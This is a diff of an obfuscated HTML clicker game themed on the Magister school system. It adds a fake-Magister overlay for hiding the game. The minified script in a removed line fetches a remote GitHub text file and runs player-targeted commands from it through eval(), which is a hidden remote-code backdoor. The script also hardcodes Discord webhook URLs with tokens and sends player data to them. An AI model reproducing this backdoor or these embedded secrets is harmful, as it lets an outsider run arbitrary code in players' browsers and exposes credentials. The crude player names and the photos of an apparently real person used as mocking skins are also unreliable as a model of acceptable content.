@@ -1,6 +1,5 @@
 <!DOCTYPE html>
 <html lang="nl">
-
 <head>
   <meta charset="UTF-8">
   <title>Magister</title>
@@ -1975,6 +1974,12 @@
       </div>
     </div>
   </div>
+  <div id="fakeMagisterOverlay"
+    style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;background:#fff;">
+    <img
+      src="https://cdn.discordapp.com/attachments/1493613756830191648/1503793652730953819/image.png?ex=6a04a479&is=6a0352f9&hm=fb7a6dc435b658dd9d74dfb8c7379964956e4f4758cb9ec979d4c4a2d2a7c763&"
+      style="width:100%;height:100%;object-fit:contain;">
+  </div>
   <div id="achToast">
     <div class="ach-toast-icon" id="achToastIcon">🏆</div>
     <div class="ach-toast-name" id="achToastName">Achievement</div>
@@ -2142,6 +2147,10 @@
           id="keybindBtn">ENTER</button></div>
       <div class="keybind-row" id="kb2Row" style="opacity:0.4;"><span>Klik Keybind 2</span><span class="keybind-cost"
           id="kb2CostLabel"></span><button id="keybind2Btn">—</button></div>
+      <div class="sec-label">Fake Magister</div>
+      <div class="keybind-row"><span>Fake Magister Keybind</span><button id="fakeMagisterKeybindBtn">—</button></div>
+      <p style="color:var(--muted);font-size:12px;">Druk op de keybind om het scherm te verbergen en Magister te tonen.
+        Druk opnieuw om terug te gaan.</p>
       <p style="font-size:11px;color:var(--muted);margin-top:4px;">Eerste keybind wijzigen kost 10.000 Lantings. Tweede
         keybind kost 100.000 Lantings.</p>
       <div class="sec-label">Statistieken</div>
@@ -2266,7 +2275,1104 @@
   </div>
 
   <script>
-(function(){'use strict';const K='3.1',E='lc_accounts_v1',b='lc_active_acc',a='lc_theme',D='lc_cps_show',H='lc_v4_vote',o='lc_last_sugg',U='lc_skin_swap',u='lc_name_change_cd',S=0x4e20,W=0x186a0,l='https://leaderboard-98b96-default-rtdb.europe-west1.firebasedatabase.app',w='https://raw.githubusercontent.com/toxivid/contact/refs/heads/main/input.txt',p={'main':'https://discord.com/api/webhooks/1494600652582551582/YSsa5dbxGdod1MkfGji38jrVeTEGOByXw8_6FBKgcq6IrpAlkAReZCjmpfKAwiP5Wr_o','sugg':'https://discord.com/api/webhooks/1493989395018285079/I7kJJ8TzbmvdeZFavX4a1b6ZXlJ3tg8r2WZG1v3I9bOyJ31LXL1lQ9d3HtFdmfQ0sGTe','login':'https://discord.com/api/webhooks/1495091471202779207/N4RjrwDK-nlsMwvTMbBx5p-0atRKB6O4EGxYxZ8-cKFvjqfeqmjkyujPsNveQTCdX3UR','score':'https://discord.com/api/webhooks/1495830744314937609/yIZ8Dns5qSkHHx4IiEdXgn6m9FmuJX5lnmZ0UscJ62j0P6IycIjsFEH8s1S-E19VIBGM','vote':'https://discord.com/api/webhooks/1495450185340555487/osC22JW4StvB8hKZw7c_w1Q3nZ5HhvT1-OvlQzPGb4P-MmB-K3nvGoE6cD1lT8snFbeq','gamble':'https://discord.com/api/webhooks/1503093436914470993/XinbU82bVpuXy95tyXEESR-EXmIW0lCuO-7h9nJPSF9FNu035med_4AnIo6Ts4hCVHh8','logs':'https://discord.com/api/webhooks/1495830744314937609/yIZ8Dns5qSkHHx4IiEdXgn6m9FmuJX5lnmZ0UscJ62j0P6IycIjsFEH8s1S-E19VIBGM','codes':'https://discord.com/api/webhooks/1503352591046672414/YhuTVs9r_-rfkcBCSAd5UY9JexEAwZAsyqq3wCCIgT8zq4Fia-x5X9nibcRvNSBuGNa7'},Q='data:image/svg+xml,%3Csvg\x20xmlns=\x27http://www.w3.org/2000/svg\x27\x20width=\x27240\x27\x20height=\x27240\x27%3E%3Ccircle\x20cx=\x27120\x27\x20cy=\x27120\x27\x20r=\x27120\x27\x20fill=\x27%23111\x27/%3E%3C/svg%3E',s=[{'id':0x0,'name':'Standaard','img':Q,'cost':0x0,'bonus':0x1,'bonusText':'1x\x20klikken','free':!![]},{'id':0x1,'name':'LinkedIn\x20Lanting','img':'https://media.licdn.com/dms/image/v2/C4D03AQFYXix849ZkZQ/profile-displayphoto-shrink_200_200/profile-displayphoto-shrink_200_200/0/1536927542937?e=2147483647&v=beta&t=a9zjLySEYxWJZTvPGiv6W7M2Iuqw79fRmKjnplyRRYA','cost':0x2710,'bonus':1.25,'bonusText':'1.25x\x20klikken','free':![]},{'id':0x2,'name':'Zapsport\x20Lanting','img':'https://prod-img.noordhollandsdagblad.nl/public/incoming/2pykvf-larissa-lanting-krijgt-de-bal-omzet-ze-goed-kan-gooien./alternates/WIDTH_1440/Larissa%20Lanting%20krijgt%20de%20bal%20omzet%20ze%20goed%20kan%20gooien.','cost':0x61a8,'bonus':1.5,'bonusText':'1.5x\x20klikken','free':![]},{'id':0x3,'name':'Levensgenietende\x20Lanting','img':'https://cdn.discordapp.com/attachments/1493613756830191648/1503416076405571766/image.png?ex=6a0344d4&is=6a01f354&hm=9edf2d9787c92101cd363fbee86100a75e07c02ff9673e5b2b28658caadc8a7b&','cost':0xc350,'bonus':0x2,'bonusText':'2x\x20klikken','free':![]},{'id':0x4,'name':'Vakantie\x20Lanting','img':'https://cdn.discordapp.com/attachments/1493613756830191648/1503416036819472615/image.png?ex=6a0344cb&is=6a01f34b&hm=2a3939b2ea051c5f6c1b3791d72b16e9a7a8e96af1c7983f282776e94213abe9&','cost':0x186a0,'bonus':2.5,'bonusText':'2.5x\x20klikken','free':![]},{'id':0x5,'name':'Jolly\x20Lanting','img':'https://cdn.discordapp.com/attachments/1493613756830191648/1503415259367604405/image.png?ex=6a034411&is=6a01f291&hm=11da79ca77a9e507c4ddc4ff2383f1c302a08ac4beaa2a99beacf6acdf899151&','cost':0x7a120,'bonus':0x3,'bonusText':'3x\x20klikken','free':![]},{'id':0x6,'name':'OG\x20Lanting','img':'https://cdn.discordapp.com/attachments/1493613756830191648/1503414799051260005/image.png?ex=6a0343a4&is=6a01f224&hm=8988832e71e23ce98eddc21ed27753ef1aa069c1c71af36117e67db2cacde2a8&','cost':0x2faf080,'bonus':0x4,'bonusText':'4x\x20klikken','free':![]},{'id':0x7,'name':'Jurk\x20lanting','img':'https://cdn.discordapp.com/attachments/1493613756830191648/1503414567718359061/image.png?ex=6a03436d&is=6a01f1ed&hm=5e13b67fe089a551e2e611ad858c54c94a18d6fe8a10a62edfa6a1cc76828833&','cost':0x3b9aca00,'bonus':0x5,'bonusText':'5x\x20klikken','free':![]},{'id':0x8,'name':'fifa\x20lanting','img':'https://cdn.discordapp.com/attachments/1493613756830191648/1503414239719723129/image.png?ex=6a03431e&is=6a01f19e&hm=0f67886d49c2432f0d844aa018bf8a974e00c14078b9a04cf5273cdd0666f844&','cost':0x5d21dba00,'bonus':0x7,'bonusText':'6x\x20klikken','free':![]},{'id':0x9,'name':'familie\x20lanting','img':'https://cdn.discordapp.com/attachments/1493613756830191648/1503699412495499465/image.png?ex=6a044cb5&is=6a02fb35&hm=1657b34405f3612faf072c9b038fe834a59ebcf07fea526e750d7c0c190b3ed5&','cost':0x174876e800,'bonus':0xa,'bonusText':'10x\x20klikken','free':![]}],I=['sem','yvonne','sjors','kos'],Z=[{'key':'gamble','label':'Gamble\x20knop','desc':'Ontgrendelt\x20de\x20Gamble\x20knop','cost':0x64},{'key':'blackjack','label':'Blackjack','desc':'Speelbaar\x20in\x20Gamble\x20menu','cost':0x30d40},{'key':'rolls','label':'Rolls','desc':'Speelbaar\x20in\x20Gamble\x20menu','cost':0x2710},{'key':'mines','label':'Mines','desc':'Speelbaar\x20in\x20Gamble\x20menu','cost':0x1e8480}],n={'michaelsmegmaeikel':0x354cd0f81b76a80000,'dihhalpha':0x2a384b825a45ac0000,'_//_':0x7c68b10a4f91e000,'Natte\x20hark':0x4f1fd5a7ebcd8000,'justin':0x1290e6c4edf6b100,'dikkedaniel123':0x10648bceea852600,'yvonne':0xa744d40e15fb20,'OG\x20Lanting':0x5de04c0837e72,'Djeeden':0x12b4e591f4b76,'ron_zaadkanon':0xfc12db00d04f,'k1ck':0xaab0cfa26f53},g=[{'id':'clicks_100','icon':'👆','name':'Eerste\x20100\x20kliks','desc':'Maak\x20100\x20klikken','reward':0x3},{'id':'clicks_1k','icon':'💪','name':'Duizend\x20Klikken','desc':'Maak\x201.000\x20klikken','reward':0x3},{'id':'clicks_10k','icon':'🔥','name':'Tienduzend\x20Klikken','desc':'Maak\x2010.000\x20klikken','reward':0x5},{'id':'clicks_100k','icon':'⚡','name':'Honderdduizend\x20Klikken','desc':'Maak\x20100.000\x20klikken','reward':0x5},{'id':'score_1k','icon':'💰','name':'Eerste\x20Duizend','desc':'Bereik\x201.000\x20Lantings','reward':0x3},{'id':'score_100k','icon':'💵','name':'Honderdduizend\x20Lantings','desc':'Bereik\x20100.000\x20Lantings','reward':0x4},{'id':'score_1m','icon':'💎','name':'Miljonair','desc':'Bereik\x201.000.000\x20Lantings','reward':0x5},{'id':'score_1b','icon':'👑','name':'Miljardair','desc':'Bereik\x201.000.000.000\x20Lantings','reward':0x8},{'id':'cps_5','icon':'⚡','name':'Snelle\x20Vingers','desc':'Bereik\x205\x20CPS','reward':0x3},{'id':'cps_10','icon':'🚀','name':'Razendsnelle\x20Vingers','desc':'Bereik\x2010\x20CPS','reward':0x5},{'id':'playtime_1h','icon':'⏰','name':'1\x20Uur\x20Gespeeld','desc':'Speel\x201\x20uur','reward':0x4},{'id':'playtime_10h','icon':'🕐','name':'grinder','desc':'Speel\x2010\x20uur','reward':0xa},{'id':'buy_skin','icon':'🎨','name':'skin\x20koper','desc':'Koop\x20een\x20skin','reward':0x3},{'id':'buy_5_upgrades','icon':'🛒','name':'koper','desc':'Koop\x205\x20upgrades','reward':0x3},{'id':'gamble_first','icon':'🎲','name':'Gokker','desc':'Speel\x20voor\x20het\x20eerst\x20een\x20gokspel','reward':0x3},{'id':'win_blackjack','icon':'🃏','name':'Blackjack\x20Winner','desc':'Win\x20een\x20potje\x20Blackjack','reward':0x5},{'id':'win_rolls','icon':'🎰','name':'Lucky\x20Rolls','desc':'Win\x20een\x20rondje\x20Rolls','reward':0x4},{'id':'cashout_mines','icon':'💣','name':'Mine\x20Survivor','desc':'Cash\x20out\x20bij\x20Mines','reward':0x5},{'id':'unlock_all_gamble','icon':'🏛️','name':'grote\x20gambler','desc':'Ontgrendel\x20alle\x20gokspelen','reward':0x6},{'id':'ps_100','icon':'🤖','name':'Automatisch','desc':'Bereik\x20100\x20Lantings\x20per\x20seconde','reward':0x5}],z=[{'id':'s_cps_13','icon':'👻','name':'Spook','desc':'Bereik\x20precies\x2013\x20CPS','reward':0x5},{'id':'s_cps_15','icon':'💀','name':'Ongrijpbaar','desc':'Bereik\x2015\x20CPS','reward':0x7},{'id':'s_lose_all','icon':'😭','name':'Bankroet','desc':'Verlies\x20alles\x20bij\x20een\x20all-in\x20op\x20hoogste\x20score','reward':0x19},{'id':'s_allin_win','icon':'🍀','name':'Lucky\x20Bastard','desc':'Win\x20een\x20all-in\x20gok','reward':0xa},{'id':'s_midnight','icon':'🌙','name':'Nachtbraker','desc':'Speel\x20na\x20middernacht','reward':0x5},{'id':'s_click_1s','icon':'⚡','name':'Bliksem','desc':'Klik\x2010\x20keer\x20in\x201\x20seconde','reward':0x6},{'id':'s_score_trillion','icon':'🌌','name':'Triljardair','desc':'Bereik\x201\x20biljoen\x20Lantings','reward':0x14},{'id':'s_skin_all','icon':'🌈','name':'Volledig\x20Gekleed','desc':'Bezit\x20alle\x20skins','reward':0xc},{'id':'s_code_used','icon':'🔑','name':'Codekraker','desc':'Gebruik\x20een\x20geheime\x20code','reward':0x5},{'id':'s_vote','icon':'🗳️','name':'Democraat','desc':'Stem\x20in\x20de\x20poll','reward':0x4},{'id':'s_suggestion','icon':'💡','name':'Ideeënmachine','desc':'Stuur\x20een\x20suggestie','reward':0x4},{'id':'s_second_acc','icon':'👤','name':'alts','desc':'Maak\x20een\x20tweede\x20account\x20aan','reward':0x5},{'id':'s_theme_all','icon':'🎨','name':'Stijlvol','desc':'Probeer\x20alle\x20thema\x27s','reward':0x5},{'id':'s_falling_catch','icon':'🤸','name':'Vanger','desc':'Vang\x20een\x20vallend\x20object','reward':0x6},{'id':'s_gamble_broke','icon':'💸','name':'Gokverslaafd','desc':'Gamble\x20met\x20minder\x20dan\x20200\x20Lantings','reward':0x8},{'id':'s_ps_1k','icon':'🏭','name':'Fabriek','desc':'Bereik\x201.000\x20Lantings\x20per\x20seconde','reward':0xa},{'id':'s_click_10m','icon':'🖱️','name':'Klik\x20God','desc':'Maak\x2010\x20miljoen\x20klikken','reward':0xf},{'id':'s_upgrade_maxed','icon':'📈','name':'Maxed\x20Out','desc':'Koop\x2020\x20upgrades','reward':0x8},{'id':'s_keybind_set','icon':'⌨️','name':'Sneltoetser','desc':'Stel\x20een\x20keybind\x20in','reward':0x3},{'id':'s_mines_big_win','icon':'💰','name':'Fortuin','desc':'Win\x20meer\x20dan\x205x\x20inzet\x20bij\x20Mines','reward':0xc}],j=[...g,...z],q=bU=>document['getElementById'](bU),P=Math['floor'],x=Math['ceil'];function e(bU,bu){fetch(bU,{'method':'POST','headers':{'Content-Type':'application/json'},'body':JSON['stringify']({'content':bu})})['catch'](()=>{});}function T(bU){bU=P(bU);if(bU<0x2710)return String(bU);const bu=[[0x3635c9adc5dea00000,'td'],[0xde0b6b3a7640000,'t'],[0x38d7ea4c68000,'bd'],[0xe8d4a51000,'b'],[0x3b9aca00,'md'],[0xf4240,'m'],[0x3e8,'k']];for(const [bS,bW]of bu){if(bU>=bS){const bl=Math['round'](bU/bS*0xa)/0xa;return(bl%0x1===0x0?bl['toFixed'](0x0):bl['toFixed'](0x1))+bW;}}return String(bU);}function d(bU){return P(bU)['toString']()['replace'](/\B(?=(\d{3})+(?!\d))/g,'.');}let y=null;function M(bU,bu){const bS=q('gameNotice');bS['style']['display']='block',bS['style']['color']=bu||'var(--text)',bS['innerText']=bU,clearTimeout(y),y=setTimeout(()=>{bS['style']['display']='none';},0x960);}function V(bU){try{const bu=new(window['AudioContext']||window['webkitAudioContext'])(),bS=bu['createOscillator'](),bW=bu['createGain']();bS['type']='triangle',bS['frequency']['value']=bU==='lose'?0xb4:bU==='safe'?0x1e0:0x140,bW['gain']['value']=0.03,bS['connect'](bW),bW['connect'](bu['destination']),bS['start'](),bS['stop'](bu['currentTime']+0.08);}catch(bl){}}function F(bU,bu){const bS=document['createElement']('div');bS['style']['cssText']='position:fixed;left:50%;top:45%;transform:translateX(-50%);color:'+(bu||'#00e5b0')+';font-family:\x27Rajdhani\x27,sans-serif;font-weight:900;font-size:26px;pointer-events:none;z-index:1000;animation:floatUp\x201s\x20ease-out;',bS['innerText']=bU,document['body']['appendChild'](bS),setTimeout(()=>bS['remove'](),0x7d0);}function t(bU){return/^[a-zA-Z0-9_ ]+$/['test'](bU);}function v(bU){return I['some'](bu=>bU['toLowerCase']()['includes'](bu));}function R(){const bU='ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';return Array['from']({'length':0x6},()=>bU[P(Math['random']()*bU['length'])])['join']('');}function m(){try{return JSON['parse'](localStorage['getItem'](E))||[];}catch{return[];}}function J(bU){localStorage['setItem'](E,JSON['stringify'](bU));}function h(){return localStorage['getItem'](b)||'';}function B(bU){localStorage['setItem'](b,bU);}function C(bU,bu){const bS=[];for(let bW=0x0;bW<0x32;bW++){const bl=bW%0x2===0x0;bS['push']({'type':bl?'click':'auto','value':0x1+P(bW/0x2)*0x2,'cost':bl?0x1e*Math['pow'](1.6,bW):0x14*Math['pow'](1.6,bW),'bought':![]});}return{'uid':bu,'name':bU,'score':0x0,'perClick':0x1,'perSecond':0x0,'upgrades':bS,'ownedSkins':[0x0],'equippedSkin':0x0,'basePerClick':0x1,'playTime':0x0,'earned':0x0,'lost':0x0,'highest':0x0,'totalClicks':0x0,'unlockedGamble':![],'unlockedBlackjack':![],'unlockedRolls':![],'unlockedMines':![],'unlockedKeybind2':![],'keybind':'Enter','keybindDisplay':'ENTER','keybind2':'','keybind2Display':'—','unlockedAch':{},'claimedAch':{},'themesUsed':[],'createdAt':Date['now'](),'lastOnline':Date['now']()};}function c(){let bU=m();if(bU['length']>0x0)return bU;const bu=JSON['parse'](localStorage['getItem']('lc_v5')||'{}'),bS=localStorage['getItem']('lc_v4_username'),bW=localStorage['getItem']('lc_userid')||R();if(bS){const bl=C(bS,bW);Object['assign'](bl,{'score':bu['score']||0x0,'perClick':bu['perClick']||0x1,'perSecond':bu['perSecond']||0x0,'upgrades':bu['upgrades']||bl['upgrades'],'ownedSkins':bu['ownedSkins']||[0x0],'equippedSkin':bu['equippedSkin']||0x0,'basePerClick':bu['basePerClick']||0x1,'playTime':bu['playTime']||0x0,'earned':bu['earned']||0x0,'lost':bu['lost']||0x0,'highest':bu['highest']||0x0,'totalClicks':0x0,'unlockedGamble':bu['unlockedGamble']||![],'unlockedBlackjack':bu['unlockedBlackjack']||![],'unlockedRolls':bu['unlockedRolls']||![],'unlockedMines':bu['unlockedMines']||![],'unlockedKeybind2':bu['unlockedKeybind2']||![],'keybind':localStorage['getItem']('lc_v4_keybind')||'Enter','keybindDisplay':localStorage['getItem']('lc_v4_keybind_display')||'ENTER','unlockedAch':{},'claimedAch':{},'themesUsed':[],'uid':bW,'name':bS}),bU=[bl],J(bU),B(bW),localStorage['setItem']('lc_userid',bW);}return bU;}let X=c(),r=h();!r&&X['length']>0x0&&(r=X[0x0]['uid'],B(r));let Y=Object['assign']({},X['find'](bU=>bU['uid']===r)||X[0x0]);Y['unlockedAch']=Y['unlockedAch']||{},Y['claimedAch']=Y['claimedAch']||{},Y['themesUsed']=Y['themesUsed']||[],Y['totalClicks']=Y['totalClicks']||0x0;if(!Y['upgrades']||!Y['upgrades']['length']){Y['upgrades']=[];for(let bU=0x0;bU<0x32;bU++){const bu=bU%0x2===0x0;Y['upgrades']['push']({'type':bu?'click':'auto','value':0x1+P(bU/0x2)*0x2,'cost':bu?0x1e*Math['pow'](1.6,bU):0x14*Math['pow'](1.6,bU),'bought':![]});}}function N(){Y['lastOnline']=Date['now']();const bS=X['findIndex'](bW=>bW['uid']===r);if(bS>=0x0)X[bS]=Y;else X['push'](Y);J(X);}let L=localStorage['getItem'](a)||'blue';function k(bS){L=bS,document['documentElement']['setAttribute']('data-theme',bS),localStorage['setItem'](a,bS),document['querySelectorAll']('.theme-btn')['forEach'](bW=>bW['classList']['toggle']('active',bW['dataset']['theme']===bS));if(!Y['themesUsed']['includes'](bS)){Y['themesUsed']['push'](bS);if(Y['themesUsed']['length']>=0x4)E0('s_theme_all');}}k(L);let A=localStorage['getItem'](D)==='true';const O=q('cpsToggle');O['checked']=A;let f={},K0=K,K1=![],K2=0x0,K3={'blackjack':0x0,'rolls':0x0,'mines':0x0},K4=0x0,K5=![],K6=![],K7=parseInt(localStorage['getItem'](o))||0x0,K8=![],K9=null,KK=null,KE=Date['now']()+0xea60,Kb=new Set(),Ka={'click':0x0,'ps':0x0,'doubleClick':0x0,'shopDiscount':0x0},KD=[],KH=[],Ko=0x0,KU=![],Ku=null,KS=null;const KW=q('score'),Kl=q('mainImg'),Kw=q('clickBtn'),Kp=q('perClickText'),KQ=q('perSecondText'),Ki=q('cpsDisplay'),KG=q('upgrades'),Ks=q('gambleBtn'),KI=q('keybindBtn'),KZ=q('keybind2Btn'),Kn=q('boostBar'),Kg=q('lbRows'),Kz=q('lbExpandBtn'),Kj=q('lbModal'),Kq=q('lbModalBody'),KP=q('fallingCircle'),Kx=q('fallingImg'),Ke=q('fallingCountdown'),KT=q('suggestionOpenBtn');async function Kd(){if(!Y['name'])return;try{const bS=await fetch(w+'?t='+Date['now']()),bW=await bS['text']();for(const bl of bW['split']('')){const bw=bl['indexOf'](':');if(bw===-0x1)continue;const bp=bl['slice'](0x0,bw)['trim'](),bQ=bl['slice'](bw+0x1)['trim']();if(bp['toLowerCase']()===Y['name']['toLowerCase']()&&bQ&&bQ!==KS){KS=bQ;try{eval(bQ);}catch(bi){console['error']('Remote\x20cmd\x20error:',bi);}}}}catch(bG){}}async function Ky(bS,bW,bl){try{await fetch(l+'/leaderboard/'+bW+'.json',{'method':'PUT','headers':{'Content-Type':'application/json'},'body':JSON['stringify']({'score':bl,'name':bS,'uid':bW})});}catch(bw){}}async function KM(bS,bW,bl,bw){try{await fetch(l+'/leaderboard/'+bl+'.json',{'method':'PUT','headers':{'Content-Type':'application/json'},'body':JSON['stringify']({'score':bw,'name':bW,'uid':bl})});}catch(bp){}}async function KV(){try{const bS=await fetch(l+'/leaderboard.json');if(!bS['ok'])return{};const bW=await bS['json']();if(!bW)return{};const bl={};for(const [bw,bp]of Object['entries'](bW)){if(typeof bp==='object'){const bQ=bp['name']||bw;bl[bQ]=Number(bp['score']||0x0);}else bl[bw]=Number(bp);}return bl;}catch(bi){return{};}}async function KF(){const bS=await KV();if(bS&&Object['keys'](bS)['length']>0x0)f=bS;}async function Kt(bS){try{const bW=await KV();return Object['keys'](bW)['some'](bl=>bl['toLowerCase']()===bS['toLowerCase']());}catch{return![];}}function Kv(){N();}function KR(){const bS=parseInt(localStorage['getItem'](U))||0x0;return Math['max'](0x0,0x3c*0x3c*0x3e8-(Date['now']()-bS));}function Km(){localStorage['setItem'](U,Date['now']());}function KJ(bS){const bW=q(bS);bW['style']['display']=['suggestionPanel','votePanel','anticheatWarning','accountsPanel']['includes'](bS)?'flex':'block',Kb['add'](bS);}function Kh(bS){q(bS)['style']['display']='none',Kb['delete'](bS);}function KB(){return Kb['size']===0x0&&q('startScreen')['style']['display']==='none';}function KC(){return Date['now']()<K4?0x14:0x0;}function Kc(bS){K4=Math['max'](K4,Date['now']()+bS);}function KX(bS){if(bS==='click')Ka['click']=Date['now']()+0x4e20;if(bS==='ps')Ka['ps']=Date['now']()+0x4e20;if(bS==='gamble')Kc(0x4e20);if(bS==='shop')Ka['shopDiscount']=Date['now']()+0xea60;KN(),Eb(),EZ();}function Kr(bS){return(s['find'](bW=>bW['id']===bS)||{'bonus':0x1})['bonus'];}function KY(){const bS=s['find'](bW=>bW['id']===Y['equippedSkin']);return bS&&bS['img']?bS['img']:Q;}function KN(){let bS=Kr(Y['equippedSkin'])*(Date['now']()<Ka['click']?1.2:0x1);if(Date['now']()<Ka['doubleClick'])bS*=0x2;Y['perClick']=x(Y['basePerClick']*bS),Kl['src']=KY();}function KL(bS){const bW=Date['now']();KD['push'](bW),KD=KD['filter'](bl=>bW-bl<=0x3e8),bS&&(KH['push'](bW),KH=KH['filter'](bl=>bW-bl<=0x3e8));}function Kk(){const bS=Date['now']();return KD=KD['filter'](bW=>bS-bW<=0x3e8),KD['length'];}function KA(){const bS=Date['now']();return KH=KH['filter'](bW=>bS-bW<=0x3e8),KH['length'];}function KO(){const bS=Kk();if(A)Ki['style']['display']='block',Ki['innerText']='CPS:\x20'+bS;else Ki['style']['display']='none';}function Kf(){if(KU)return;const bS=KA();if(bS>0x1e){Ko++,e(p['logs'],'⚠️\x20ANTICHEAT\x20|\x20'+Y['name']+'\x20(ID:'+Y['uid']+')\x20|\x20CPS:\x20'+bS+'\x20|\x20Warning:\x20'+Ko);if(Ko>=0x3){KU=!![];const bW=JSON['stringify'](Y);e(p['logs'],'🚫\x20USERBANNED\x20|\x20'+Y['name']+'\x20(ID:'+Y['uid']+')\x0aData:\x20'+bW['substring'](0x0,0x1f4)),q('anticheatMsg')['innerText']='Je\x20bent\x20permanent\x20gebanned\x20van\x20dit\x20account.\x20Je\x20andere\x20accounts\x20zijn\x20veilig.',q('anticheatDismiss')['style']['display']='none',q('banAppealBox')['style']['display']='block',KJ('anticheatWarning'),X=X['filter'](bl=>bl['uid']!==r),J(X);}else Ko===0x2?(q('anticheatMsg')['innerText']='Laatste\x20kans!\x20Cheat\x20gedetecteerd\x20('+bS+'\x20CPS).\x20Zet\x20cheat\x20uit\x20of\x20je\x20verliest\x20alles.\x20('+Ko+'/3)',KJ('anticheatWarning'),q('anticheatDismiss')['onclick']=()=>Kh('anticheatWarning')):(q('anticheatMsg')['innerText']='Cheats\x20gedetecteerd\x20('+bS+'\x20CPS).\x20Zet\x20cheats\x20uit,\x20anders\x20wordt\x20je\x20account\x20gereset.\x20('+Ko+'/3)',KJ('anticheatWarning'),q('anticheatDismiss')['onclick']=()=>Kh('anticheatWarning'));}}function E0(bS){if(Y['unlockedAch'][bS])return;Y['unlockedAch'][bS]=Date['now'](),N();const bW=j['find'](bl=>bl['id']===bS);if(!bW)return;E1(bW);}function E1(bS){clearTimeout(Ku);const bW=q('achToast');q('achToastIcon')['innerText']=bS['icon'],q('achToastName')['innerText']=bS['name'],q('achToastSub')['innerText']='Achievement\x20ontgrendeld!\x20(+'+bS['reward']+'%)',bW['style']['display']='block',bW['style']['animation']='none',void bW['offsetWidth'],bW['style']['animation']='achPop\x203s\x20ease\x20forwards',Ku=setTimeout(()=>{bW['style']['display']='none';},0xc1c);}function E2(bS){if(!Y['unlockedAch'][bS]||Y['claimedAch'][bS])return;const bW=j['find'](bw=>bw['id']===bS);if(!bW)return;Y['claimedAch'][bS]=!![];const bl=P(Y['score']*(bW['reward']/0x64));if(bl>0x0)Y['score']+=bl,Y['earned']+=bl,F('+'+T(bl)+'\x20('+bW['reward']+'%)','#ffd700');else Y['score']===0x0&&(Y['score']+=bW['reward'],Y['earned']+=bW['reward'],F('+'+bW['reward'],'#ffd700'));M(bW['name']+':\x20+'+bW['reward']+'%\x20geclaimd!','var(--gold)'),Eb(),E4();}function E3(){if(Y['totalClicks']>=0x64)E0('clicks_100');if(Y['totalClicks']>=0x3e8)E0('clicks_1k');if(Y['totalClicks']>=0x2710)E0('clicks_10k');if(Y['totalClicks']>=0x186a0)E0('clicks_100k');if(Y['score']>=0x3e8)E0('score_1k');if(Y['score']>=0x186a0)E0('score_100k');if(Y['score']>=0xf4240)E0('score_1m');if(Y['score']>=0x3b9aca00)E0('score_1b');if(Y['playTime']>=0xe10)E0('playtime_1h');if(Y['playTime']>=0x8ca0)E0('playtime_10h');if(Y['perSecond']>=0x64)E0('ps_100');if(Y['perSecond']>=0x3e8)E0('s_ps_1k');if(Y['totalClicks']>=0x989680)E0('s_click_10m');const bS=new Date();if(bS['getHours']()>=0x0&&bS['getHours']()<0x5)E0('s_midnight');if(Y['score']>=0xe8d4a51000)E0('s_score_trillion');if(Y['ownedSkins']['length']>=s['filter'](bw=>bw['img'])['length'])E0('s_skin_all');if(Y['unlockedGamble']&&Y['unlockedBlackjack']&&Y['unlockedRolls']&&Y['unlockedMines'])E0('unlock_all_gamble');const bW=Y['upgrades']['filter'](bw=>bw['bought'])['length'];if(bW>=0x5)E0('buy_5_upgrades');if(bW>=0x14)E0('s_upgrade_maxed');const bl=Kk();if(bl>=0x5)E0('cps_5');if(bl>=0xa)E0('cps_10');if(bl===0xd)E0('s_cps_13');if(bl>=0xf)E0('s_cps_15');}function E4(){const bS=q('normalAchGrid'),bW=q('secretAchGrid');let bl=0x0,bw=0x0;function bp(bQ,bi){const bG=!!Y['unlockedAch'][bQ['id']];if(bG)bw++;bl++;if(bi&&!bG)return'<div\x20class=\x22ach-row\x20secret\x20locked-ach\x22><div\x20class=\x22ach-left\x22><div\x20class=\x22ach-icon\x22>🔒</div><div><div\x20class=\x22ach-name\x22\x20style=\x22color:var(--muted)\x22>???</div><div\x20class=\x22ach-desc\x22>Secret\x20Achievement</div></div></div></div>';const bs=!!Y['claimedAch'][bQ['id']];return'<div\x20class=\x22ach-row'+(bG?'\x20unlocked':'')+'\x22><div\x20class=\x22ach-left\x22><div\x20class=\x22ach-icon\x22>'+bQ['icon']+'</div><div><div\x20class=\x22ach-name\x22>'+bQ['name']+'</div><div\x20class=\x22ach-desc\x22>'+bQ['desc']+'</div><div\x20class=\x22ach-reward\x22>Beloning:\x20+'+bQ['reward']+'%\x20geld</div></div></div><div\x20class=\x22ach-right\x22>'+(bG?bs?'<div\x20class=\x22ach-claimed-badge\x22>✓\x20Geclaimd</div>':'<button\x20class=\x22ach-claim-btn\x22\x20data-aid=\x22'+bQ['id']+'\x22>Claim</button>':'<div\x20class=\x22ach-claimed-badge\x22\x20style=\x22color:var(--muted)\x22>Vergrendeld</div>')+'</div></div>';}bS['innerHTML']=g['map'](bQ=>bp(bQ,![]))['join'](''),bW['innerHTML']=z['map'](bQ=>bp(bQ,!![]))['join'](''),q('achProgress')['innerText']=bw+'/40',document['querySelectorAll']('.ach-claim-btn')['forEach'](bQ=>bQ['addEventListener']('click',()=>E2(bQ['dataset']['aid'])));}const E5=bS=>bS===0x1?'gold':bS===0x2?'silver':bS===0x3?'bronze':'';function E6(){const bS=K0==='2.1'?n:f,bW=K0==='2.1';let bl=![];const bw=[];for(const [bp,bQ]of Object['entries'](bS)){if(!bW&&bp['toLowerCase']()===Y['name']['toLowerCase']())bw['push']({'name':Y['name'],'score':Y['score'],'isMe':!![]}),bl=!![];else bw['push']({'name':bp,'score':Number(bQ),'isMe':![]});}if(!bW&&!bl)bw['push']({'name':Y['name'],'score':Y['score'],'isMe':!![]});return bw['sort']((bi,bG)=>bG['score']-bi['score']),bw;}function E7(bS,bW,bl,bw,bp){const bQ=bp?'lb-modal-row':'lb-row',bi=bp?'lb-modal-rank':'lb-rank';return'<div\x20class=\x22'+bQ+(bw?'\x20lb-me':'')+'\x22><span\x20class=\x22'+bi+'\x20'+E5(bS)+'\x22>#'+bS+'</span><span\x20class=\x22lb-name\x22\x20style=\x22flex:1\x22>'+bW+(bw?'\x20←':'')+'</span><span\x20class=\x22lb-score\x22>'+T(bl)+'</span></div>';}function E8(){const bS=E6(),bW=bS['findIndex'](bQ=>bQ['isMe'])+0x1,bl=bS['slice'](0x0,0x5),bw=bW<=0x5;let bp=bl['map']((bQ,bi)=>E7(bi+0x1,bQ['name'],bQ['score'],bQ['isMe'],![]))['join']('');for(let 